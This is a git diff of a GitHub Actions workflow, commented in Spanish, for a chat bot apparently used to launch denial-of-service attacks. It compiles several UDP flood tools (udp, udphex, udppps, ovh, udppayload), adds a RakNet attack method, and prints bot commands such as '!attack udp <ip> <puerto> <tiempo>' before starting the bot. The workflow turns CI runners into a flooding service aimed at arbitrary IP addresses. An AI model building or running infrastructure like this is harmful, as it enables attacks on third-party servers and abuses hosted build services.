@@ -1,4 +1,4 @@
-name: UDPsBot
+name: UDPsBotRaknet
 
 on:
   workflow_dispatch:
@@ -23,6 +23,12 @@ jobs:
         with:
           go-version: '1.21'
 
+      - name: Install Go dependencies
+        run: |
+          go mod init bot
+          go get github.com/sandertv/go-raknet
+          go get github.com/sirupsen/logrus
+
       - name: Install Python dependencies
         run: |
           python -m pip install --upgrade pip
@@ -35,22 +41,18 @@ jobs:
 
       - name: Build UDP binaries
         run: |
-          # Compilar udp (antiguo udphexv1)
+          # Compilar udp
           if [ -f udp.c ]; then
             gcc -O3 -pthread -o udp udp.c || true
-            echo "✓ Compilado: udp (de udp.c)"
+            echo "✓ Compilado: udp"
             chmod +x udp
-          else
-            echo "✗ udp.c no encontrado"
           fi
 
-          # Compilar udphex (antiguo udphexv2)
+          # Compilar udphex
           if [ -f udphex.c ]; then
             gcc -O3 udphex.c -o udphex || true
-            echo "✓ Compilado: udphex (de udphex.c)"
+            echo "✓ Compilado: udphex"
             chmod +x udphex
-          else
-            echo "✗ udphex.c no encontrado"
           fi
 
           # Compilar udppps
@@ -58,60 +60,43 @@ jobs:
             gcc -O3 udppps.c -o udppps || true
             echo "✓ Compilado: udppps"
             chmod +x udppps
-          else
-            echo "✗ udppps.c no encontrado"
           fi
 
-          # Compilar ovh.c
+          # Compilar ovh
           if [ -f ovh.c ]; then
             gcc -O3 -pthread ovh.c -o ovh || true
             if [ -f ovh ]; then
               echo "✓ Compilado: ovh"
               chmod +x ovh
             fi
-          else
-            echo "✗ ovh.c no encontrado"
           fi
 
-          # Compilar udppayload.c (nuevo método)
+          # Compilar udppayload
           if [ -f udppayload.c ]; then
             gcc -O3 -pthread udppayload.c -o udppayload || true
             if [ -f udppayload ]; then
-              echo "✓ Compilado: udppayload (nuevo método)"
+              echo "✓ Compilado: udppayload"
               chmod +x udppayload
             fi
-          else
-            echo "✗ udppayload.c no encontrado"
           fi
 
-          # Verificar udpflood.go
-          if [ -f udpflood.go ]; then
-            echo "✓ Encontrado: udpflood.go"
-            go build -o udpflood udpflood.go 2>/dev/null || echo "⚠ No se pudo compilar udpflood.go"
-          else
-            echo "✗ udpflood.go no encontrado"
-          fi
-
-          # Listar archivos
+          # Verificar scripts Go
           echo ""
-          echo "=== Archivos disponibles ==="
-          for bin in udp udphex udppps ovh udppayload udpflood; do
-            if [ -f "$bin" ]; then
-              echo "✓ $bin (ejecutable)"
-            elif [ -f "$bin.c" ] || [ -f "$bin.go" ]; then
-              echo "✓ $bin (archivo fuente presente)"
+          echo "=== Scripts Go ==="
+          for script in udpflood.go raknet.go; do
+            if [ -f "$script" ]; then
+              echo "✓ $script disponible"
             else
-              echo "✗ $bin (no encontrado)"
+              echo "✗ $script no encontrado"
             fi
           done
-          echo "====================================="
 
-      - name: Run bot with all methods
+      - name: Run bot
         env:
           KEYS: ${{ secrets.KEYS }}
         run: |
           echo "====================================="
-          echo "Iniciando UDPHexBot con todos los métodos"
+          echo "Iniciando bot con todos los métodos"
           echo "Comandos disponibles:"
           echo "  !attack udp <ip> <puerto> <tiempo>"
           echo "  !attack udphex <ip> <puerto> <tiempo>"
@@ -119,12 +104,7 @@ jobs:
           echo "  !attack udpflood <ip> <puerto> <tiempo>"
           echo "  !attack ovh <ip> <puerto> <tiempo>"
           echo "  !attack udppayload <ip> <puerto> <tiempo> <payload>"
-          echo "  !methods - Muestra información de métodos"
-          echo ""
-          echo "Ejemplo payload:"
-          echo "  !attack udppayload 1.1.1.1 80 60 \"GET / HTTP/1.1\\r\\nHost: 1.1.1.1\\r\\n\\r\\n\""
+          echo "  !attack raknet <ip> <puerto> <tiempo>"
+          echo "  !methods - Muestra métodos"
           echo "====================================="
-          
-          echo ""
-          echo "Iniciando bot..."
           python bot.py
